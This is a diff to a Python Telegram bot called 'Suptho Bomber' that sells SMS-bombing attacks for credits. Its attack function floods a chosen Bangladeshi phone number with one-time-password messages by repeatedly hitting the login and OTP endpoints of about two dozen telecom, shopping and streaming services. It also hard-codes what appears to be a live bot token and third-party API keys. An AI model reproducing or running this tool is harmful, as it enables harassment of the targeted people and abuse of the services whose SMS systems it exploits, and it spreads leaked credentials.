@@ -14,10 +14,10 @@ from telebot import types
 # 🔧 CONFIGURATION (SETTINGS)
 # ==========================================
 API_TOKEN = '8577991344:AAGdkMNIt1v-bSBgsQKQSjGOtaklWAYn5NI'   # <--- Bot Token দিন
-OWNER_ID = 6941003064               # <--- আপনার Telegram ID (Number)
+OWNER_ID = 6941003064               # <--- আপনার Telegram ID
 OWNER_USERNAME = "Suptho1"          # <--- Admin Username
 CHANNEL_ID = "@SH_tricks"           # <--- Channel Username
-VERSION = "2.0 (Vip)"
+VERSION = "20.0 (Vip)"
 
 bot = telebot.TeleBot(API_TOKEN)
 DATA_FILE = 'data.json'
@@ -71,57 +71,111 @@ def get_user(user_id):
     return db['users'][str_id]
 
 # ==========================================
-# 🌐 API ENGINE (TURBO MODE)
+# 🌐 API ENGINE (Amount Based)
 # ==========================================
-def api_hit(url, method, data=None, json=None):
+def api_hit(url, method, data=None, json=None, headers=None):
     try:
-        # Fast Timeout (2s)
-        head = {"User-Agent": "Mozilla/5.0 (Linux; Android 10) AppleWebKit/537.36"}
-        if method == "POST": requests.post(url, data=data, json=json, headers=head, timeout=2)
-        else: requests.get(url, headers=head, timeout=2)
+        default_headers = {
+            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
+            "Accept": "*/*",
+            "Connection": "keep-alive"
+        }
+        if headers: default_headers.update(headers)
+        
+        if method == "POST": 
+            requests.post(url, data=data, json=json, headers=default_headers, timeout=5)
+        else: 
+            requests.get(url, headers=default_headers, timeout=5)
     except: pass
 
-def attack_process(target, call_id):
+def attack_process(target, amount, call_id):
     global stop_flags
     stop_flags[call_id] = False
     
-    # Infinite Loop until Stopped
-    while not stop_flags.get(call_id, False):
-        # API List
+    sent = 0
+    while sent < amount:
+        if stop_flags.get(call_id, False): break
+        
+        # --- API List (Headers Included) ---
         api_hit("https://api.apex4u.com/api/auth/login", "POST", json={"phoneNumber": target})
-        if stop_flags.get(call_id, False): break 
+        sent += 1; time.sleep(1) # Delay for stability
+        if sent >= amount: break
         
         api_hit("https://shopbasebd.com/store/registration/sendOTP", "POST", data={"number": target, "_token": "ktrqcmKSAn8cP3vZvw3xkbav2ww65eRvaikWKDFo"})
+        sent += 1
+        if sent >= amount: break
+        
         api_hit(f"https://bikroy.com/data/phone_number_login/verifications/phone_login?phone={target}", "GET")
+        sent += 1
+        if sent >= amount: break
+
         api_hit("https://web-api.banglalink.net/api/v1/user/otp-login/request", "POST", json={"mobile": target})
+        sent += 1
+        if sent >= amount: break
+
         api_hit("https://webloginda.grameenphone.com/backend/api/v1/otp", "POST", data={"msisdn": target})
-        api_hit("https://www.bd.airtel.com/en", "POST", data=f'[{{"msisdn":"{target}"}}]', headers={"next-action": "7f9bab0f2f1355e3d2075f08076c20bed3e9ff8d7e"})
+        sent += 1
+        if sent >= amount: break
+
         api_hit("https://api.retail.jatri.co/auth/api/v1/send-otp", "POST", json={"phone": target, "purpose": "USER_LOGIN"})
+        sent += 1
+        if sent >= amount: break
+        
         api_hit(f"https://chaldal.com/yolk/api-v4/Auth/RequestOtpVerificationWithApiKey?apiKey=0cAFcWeA6egvAsgG1hCZ6i...&phoneNumber=%2B88{target}", "POST")
+        sent += 1
+        if sent >= amount: break
+
         api_hit("https://prod-services.toffeelive.com/sms/v1/subscriber/otp", "POST", json={"target": "88"+target, "resend": False})
+        sent += 1
+        if sent >= amount: break
+
         api_hit("https://api-dynamic.chorki.com/v2/auth/login?country=BD&platform=web", "POST", json={"number": "+88"+target})
-        if stop_flags.get(call_id, False): break
+        sent += 1
+        if sent >= amount: break
 
         api_hit("https://prod-api.hoichoi.dev/core/api/v1/auth/signinup/code", "POST", json={"phoneNumber": "+88"+target, "platform": "MOBILE_WEB"})
-        api_hit("https://api-dynamic.bioscopelive.com/v2/auth/login?country=BD&platform=web", "POST", json={"number": "+88"+target})
-        api_hit("https://api.shikho.com/auth/v2/send/sms", "POST", json={"phone": "88"+target, "type": "student"})
-        api_hit("https://bb-api.bohubrihi.com/public/activity/otp", "POST", json={"phone": target, "intent": "login"})
-        api_hit("https://api.ostad.app/api/v2/user/with-otp", "POST", json={"msisdn": target})
-        api_hit("https://cokestudio23.sslwireless.com/api/store-and-send-otp", "POST", json={"msisdn": "88"+target, "name": "User"})
-        api_hit("https://apix.rabbitholebd.com/appv2/login/requestOTP", "POST", json={"mobile": "+88"+target})
-        api_hit("https://api.osudpotro.com/api/v1/users/send_otp", "POST", json={"mobile": "+88-"+target, "deviceToken": "web"})
-        if stop_flags.get(call_id, False): break
-
-        api_hit(f"https://fundesh.com.bd/api/auth/generateOTP", "POST", json={"msisdn": "88"+target})
-        api_hit("https://api.swap.com.bd/api/v1/send-otp", "POST", json={"phone": target})
-        api_hit(f"https://www.rokomari.com/otp/send?emailOrPhone=88{target}", "GET")
-        api_hit(f"https://backoffice.ecourier.com.bd/api/web/individual-send-otp?mobile={target}", "GET")
-        api_hit("https://api.paragonfood.com.bd/auth/customerlogin", "POST", json={"emailOrPhone": target})
-        api_hit("https://prod-api.viewlift.com/identity/signup?site=prothomalo", "POST", json={"requestType":"send","phoneNumber":"+88"+target})
-        api_hit("https://app.eonbazar.com/api/auth/register", "POST", json={"mobile": target})
-        api_hit("https://tracking.sundarbancourierltd.com/PreBooking/SendPin", "POST", json={"PreBookingRegistrationPhoneNumber": target})
+        sent += 1
+        if sent >= amount: break
         
-        # No sleep for speed
+        api_hit("https://api.shikho.com/auth/v2/send/sms", "POST", json={"phone": "88"+target, "type": "student"})
+        sent += 1
+        if sent >= amount: break
+
+        api_hit("https://api.ostad.app/api/v2/user/with-otp", "POST", json={"msisdn": target})
+        sent += 1
+        if sent >= amount: break
+        
+        api_hit("https://cokestudio23.sslwireless.com/api/store-and-send-otp", "POST", json={"msisdn": "88"+target, "name": "User"})
+        sent += 1
+        if sent >= amount: break
+
+        api_hit("https://apix.rabbitholebd.com/appv2/login/requestOTP", "POST", json={"mobile": "+88"+target})
+        sent += 1
+        if sent >= amount: break
+
+        api_hit("https://api.osudpotro.com/api/v1/users/send_otp", "POST", json={"mobile": "+88-"+target, "deviceToken": "web"})
+        sent += 1
+        if sent >= amount: break
+        
+        api_hit("https://api.swap.com.bd/api/v1/send-otp", "POST", json={"phone": target})
+        sent += 1
+        if sent >= amount: break
+
+        api_hit(f"https://www.rokomari.com/otp/send?emailOrPhone=88{target}", "GET")
+        sent += 1
+        if sent >= amount: break
+        
+        api_hit(f"https://backoffice.ecourier.com.bd/api/web/individual-send-otp?mobile={target}", "GET")
+        sent += 1
+        if sent >= amount: break
+
+        api_hit("https://api.paragonfood.com.bd/auth/customerlogin", "POST", json={"emailOrPhone": target})
+        sent += 1
+        if sent >= amount: break
+
+        api_hit("https://tracking.sundarbancourierltd.com/PreBooking/SendPin", "POST", json={"PreBookingRegistrationPhoneNumber": target})
+        sent += 1
+        if sent >= amount: break
 
 # ==========================================
 # 🤖 MAIN MENU & BUTTONS
@@ -143,72 +197,71 @@ def welcome(message):
         db['users'][user_id] = {"credits": 5, "joined": time.time(), "ref_by": referrer}
         save_data(db)
 
-    # 🟢 NEW BUTTON LAYOUT
+    # 🟢 BUTTON DESIGN (Updated)
     markup = types.ReplyKeyboardMarkup(resize_keyboard=True, row_width=2)
     
-    # Row 1
     markup.add(types.KeyboardButton("🚀 Start Bomb"))
-    # Row 2 (Balance added here)
-    markup.add(types.KeyboardButton("💳 My Balance"), types.KeyboardButton("👥 Refer to Earn"))
-    # Row 3
-    markup.add(types.KeyboardButton("💰 Redeem Credit"), types.KeyboardButton("👑 Admin"))
+    markup.add(types.KeyboardButton("💰 Redeem Credit"), types.KeyboardButton("👥 Refer & Earn"))
+    markup.add(types.KeyboardButton("💳 My Balance"), types.KeyboardButton("👑 Admin Panel"))
 
     safe_name = html.escape(message.from_user.first_name)
-    
-    text = f"🔥 <b>SUPTHO BOMBER VIP</b> 🔥\n\n👋 Welcome, <b>{safe_name}</b>\n\n👇 Select an option from below:"
-    
+    text = f"🔥 <b>SUPTHO BOMBER V16</b> 🔥\n\n👋 Welcome, <b>{safe_name}</b>\n\n👇 Select an option from below:"
     bot.send_message(message.chat.id, text, parse_mode='HTML', reply_markup=markup)
 
 # ==========================================
-# 🎮 BUTTON HANDLERS
+# 🎮 BOMBING HANDLERS
 # ==========================================
-
-# 1. Start Bomb
 @bot.message_handler(func=lambda message: message.text == "🚀 Start Bomb")
 def start_bomb_handler(message):
     if not is_joined(message.from_user.id):
         return bot.reply_to(message, "❌ Please Join Channel First: @SH_tricks")
-    msg = bot.reply_to(message, "💣 <b>Enter Target Number:</b>\n(e.g., 017xxxxxxxx)", parse_mode='HTML')
-    bot.register_next_step_handler(msg, process_bombing)
-
-def process_bombing(message):
-    user_id = str(message.from_user.id)
-    target = message.text.strip()
     
+    msg = bot.reply_to(message, "💣 <b>Enter Target Number:</b>\n(e.g., 017xxxxxxxx)", parse_mode='HTML')
+    bot.register_next_step_handler(msg, ask_amount)
+
+def ask_amount(message):
+    target = message.text.strip()
+    if len(target) != 11 or not target.isdigit():
+        return bot.reply_to(message, "❌ Invalid Number!")
+    
+    msg = bot.reply_to(message, f"🎯 Target: <code>{target}</code>\n\n🔢 <b>Enter Amount:</b>\n(Max 100)", parse_mode='HTML')
+    bot.register_next_step_handler(msg, process_bombing, target)
+
+def process_bombing(message, target):
+    user_id = str(message.from_user.id)
+    try: amount = int(message.text.strip())
+    except: return bot.reply_to(message, "❌ Amount must be a number!")
+
     if user_id in db['banned']: return bot.reply_to(message, "🚫 You are BANNED.")
     if target in db['whitelist']: return bot.reply_to(message, "🛡️ This number is PROTECTED.")
-    if db['users'][user_id]['credits'] < 1: return bot.reply_to(message, "⚠️ Not enough credits! Please Refer or Redeem code.")
-    if len(target) != 11 or not target.isdigit(): return bot.reply_to(message, "❌ Invalid Number format!")
+    if db['users'][user_id]['credits'] < 1: return bot.reply_to(message, "⚠️ Not enough credits!")
+    if amount > 100: return bot.reply_to(message, "⚠️ Limit is 100 SMS.")
 
     db['users'][user_id]['credits'] -= 1
     save_data(db)
     
     markup = types.InlineKeyboardMarkup()
-    markup.add(types.InlineKeyboardButton("⛔ STOP ATTACK", callback_data=f"stop_{user_id}"))
+    markup.add(types.InlineKeyboardButton("⛔ STOP", callback_data=f"stop_{user_id}"))
     
-    bot.reply_to(message, f"🚀 <b>Attack Started!</b>\n🎯 Target: <code>{target}</code>\n⚡ Status: <b>TURBO MODE</b>", parse_mode='HTML', reply_markup=markup)
-    threading.Thread(target=attack_process, args=(target, f"stop_{user_id}")).start()
+    bot.reply_to(message, f"🚀 <b>Attack Started!</b>\n🎯 Target: <code>{target}</code>\n🔢 Amount: <b>{amount}</b>\n💸 Cost: 1 Credit", parse_mode='HTML', reply_markup=markup)
+    threading.Thread(target=attack_process, args=(target, amount, f"stop_{user_id}")).start()
 
-# 2. CHECK BALANCE (NEW FEATURE)
+# ==========================================
+# 🎮 OTHER HANDLERS
+# ==========================================
 @bot.message_handler(func=lambda message: message.text == "💳 My Balance")
 def balance_handler(message):
-    user_id = str(message.from_user.id)
-    user = get_user(user_id)
-    
-    text = f"💳 <b>My Account Status</b>\n\n👤 Name: <b>{html.escape(message.from_user.first_name)}</b>\n🆔 ID: <code>{user_id}</code>\n💰 <b>Current Balance: {user['credits']} Credits</b>"
-    
-    bot.reply_to(message, text, parse_mode='HTML')
+    user = get_user(message.from_user.id)
+    bot.reply_to(message, f"💳 <b>My Wallet</b>\n\n💰 Credits: <b>{user['credits']}</b>\n🆔 ID: <code>{message.from_user.id}</code>", parse_mode='HTML')
 
-# 3. Refer
-@bot.message_handler(func=lambda message: message.text == "👥 Refer to Earn")
+@bot.message_handler(func=lambda message: message.text == "👥 Refer & Earn")
 def refer_handler(message):
     user_id = str(message.from_user.id)
     try: bot_username = bot.get_me().username
-    except: bot_username = "YourBotUserName"
+    except: bot_username = "YourBotName"
     link = f"https://t.me/{bot_username}?start={user_id}"
-    bot.reply_to(message, f"🎁 <b>Refer & Earn</b>\n\nLink: <code>{link}</code>\n\nReward: +5 Credits per refer.", parse_mode='HTML')
+    bot.reply_to(message, f"🎁 <b>Refer & Earn</b>\n\n🔗 Link:\n<code>{link}</code>\n\n💎 Reward: <b>+5 Credits</b> per refer.", parse_mode='HTML')
 
-# 4. Redeem
 @bot.message_handler(func=lambda message: message.text == "💰 Redeem Credit")
 def redeem_handler(message):
     msg = bot.reply_to(message, "🎁 <b>Enter Redeem Code:</b>", parse_mode='HTML')
@@ -224,30 +277,80 @@ def process_code(message):
         bot.reply_to(message, "✅ <b>Success!</b> +5 Credits added.", parse_mode='HTML')
     else: bot.reply_to(message, "❌ Invalid Code.")
 
-# 5. Admin Contact
-@bot.message_handler(func=lambda message: message.text == "👑 Admin")
-def admin_contact_handler(message):
-    markup = types.InlineKeyboardMarkup()
-    markup.add(types.InlineKeyboardButton("💬 Message Admin", url=f"https://t.me/{OWNER_USERNAME}"))
-    bot.reply_to(message, f"👑 <b>Admin Contact</b>", parse_mode='HTML', reply_markup=markup)
+@bot.message_handler(func=lambda message: message.text == "👑 Admin Panel")
+def admin_contact(message):
+    if message.from_user.id == OWNER_ID:
+        bot.reply_to(message, "👑 <b>Admin Panel Active!</b>\nUse commands like /stats, /addcredit", parse_mode='HTML')
+    else:
+        markup = types.InlineKeyboardMarkup()
+        markup.add(types.InlineKeyboardButton("💬 Message Admin", url=f"https://t.me/{OWNER_USERNAME}"))
+        bot.reply_to(message, "👑 <b>Contact Admin</b>", parse_mode='HTML', reply_markup=markup)
 
-# Stop Callback
 @bot.callback_query_handler(func=lambda call: call.data.startswith("stop_"))
 def stop_callback(call):
     stop_flags[call.data] = True
     bot.edit_message_text("✅ <b>Attack Stopped!</b>", call.message.chat.id, call.message.message_id, parse_mode='HTML')
 
 # ==========================================
-# 👑 ADMIN PANEL
+# 👑 ADMIN COMMANDS (UPDATED)
 # ==========================================
-@bot.message_handler(commands=['admin', 'gencodes', 'broadcast', 'ban', 'unban', 'white', 'unwhite'])
+@bot.message_handler(commands=['admin', 'gencodes', 'broadcast', 'ban', 'unban', 'white', 'unwhite', 'addcredit', 'cutcredit', 'stats', 'info'])
 def admin_commands(message):
     if message.from_user.id != OWNER_ID: return
     args = message.text.split()
     cmd = args[0]
+    
     try:
         if cmd == '/admin':
-            bot.reply_to(message, "Commands:\n/gencodes <n>\n/broadcast <msg>\n/ban <id>\n/white <num>")
+            text = """
+👑 <b>Admin Commands:</b>
+/stats - View bot statistics
+/gencodes <n> - Generate codes
+/addcredit <id> <amount> - Give credits
+/cutcredit <id> <amount> - Remove credits
+/info <id> - User info
+/ban <id> - Ban user
+/white <num> - Protect number
+/broadcast <msg> - Send notice
+            """
+            bot.reply_to(message, text, parse_mode='HTML')
+
+        # 1. Add Credit
+        elif cmd == '/addcredit':
+            uid, amt = args[1], int(args[2])
+            get_user(uid) # Ensure user exists
+            db['users'][uid]['credits'] += amt
+            save_data(db)
+            bot.reply_to(message, f"✅ Added {amt} credits to {uid}")
+            try: bot.send_message(uid, f"🎁 <b>Admin added {amt} credits to your account!</b>", parse_mode='HTML')
+            except: pass
+
+        # 2. Cut Credit
+        elif cmd == '/cutcredit':
+            uid, amt = args[1], int(args[2])
+            if uid in db['users']:
+                db['users'][uid]['credits'] -= amt
+                save_data(db)
+                bot.reply_to(message, f"✅ Removed {amt} credits from {uid}")
+
+        # 3. Stats
+        elif cmd == '/stats':
+            users = len(db['users'])
+            banned = len(db['banned'])
+            codes = len(db['codes'])
+            whitelist = len(db['whitelist'])
+            bot.reply_to(message, f"📊 <b>Bot Stats:</b>\n\n👥 Users: {users}\n🚫 Banned: {banned}\n🎟️ Active Codes: {codes}\n🛡️ Protected: {whitelist}", parse_mode='HTML')
+
+        # 4. User Info
+        elif cmd == '/info':
+            uid = args[1]
+            if uid in db['users']:
+                u = db['users'][uid]
+                bot.reply_to(message, f"👤 <b>User Info:</b>\n\n🆔 ID: {uid}\n💰 Credits: {u['credits']}\n🔗 Ref By: {u['ref_by']}", parse_mode='HTML')
+            else:
+                bot.reply_to(message, "❌ User not found.")
+
+        # Other Commands
         elif cmd == '/gencodes':
             amount = int(args[1])
             new_codes = ["SUP-" + ''.join(random.choices(string.ascii_uppercase + string.digits, k=6)) for _ in range(amount)]
@@ -261,23 +364,16 @@ def admin_commands(message):
             for uid in db['users']:
                 try: bot.send_message(uid, f"📢 <b>NOTICE:</b>\n{msg}", parse_mode='HTML')
                 except: pass
-            bot.reply_to(message, "✅ Broadcast Done.")
+            bot.reply_to(message, "✅ Done.")
         elif cmd == '/ban':
             db['banned'].append(args[1])
             save_data(db)
             bot.reply_to(message, "🚫 Banned.")
-        elif cmd == '/unban':
-            if args[1] in db['banned']: db['banned'].remove(args[1])
-            save_data(db)
-            bot.reply_to(message, "✅ Unbanned.")
         elif cmd == '/white':
             db['whitelist'].append(args[1])
             save_data(db)
-            bot.reply_to(message, "🛡️ Whitelisted.")
-        elif cmd == '/unwhite':
-            if args[1] in db['whitelist']: db['whitelist'].remove(args[1])
-            save_data(db)
-            bot.reply_to(message, "🗑️ Removed.")
+            bot.reply_to(message, "🛡️ Protected.")
+            
     except Exception as e: bot.reply_to(message, f"❌ Error: {e}")
 
 # ==========================================
@@ -287,5 +383,5 @@ if __name__ == "__main__":
     try: bot.remove_webhook()
     except: pass
     keep_alive()
-    print("✅ Full Bot Running...")
+    print("✅ Admin Power Bot Started...")
     bot.polling(non_stop=True)
